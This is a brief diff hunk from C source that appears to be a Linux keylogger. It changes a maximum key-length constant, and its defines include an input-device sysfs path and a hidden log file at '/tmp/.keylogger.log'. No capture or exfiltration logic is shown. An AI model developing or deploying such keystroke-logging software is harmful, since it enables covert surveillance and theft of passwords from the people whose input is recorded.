@@ -10,7 +10,7 @@
 
 #define SYS_PATH_DEVICE_NAME "/sys/class/input/%s/device/name"
 #define KEY_MAP_SIZE 128
-#define MAX_KEY_LEN 16
+#define MAX_KEY_LEN 24
 #define BUFFER_SIZE 64
 #define LOG_FILE "/tmp/.keylogger.log"
 
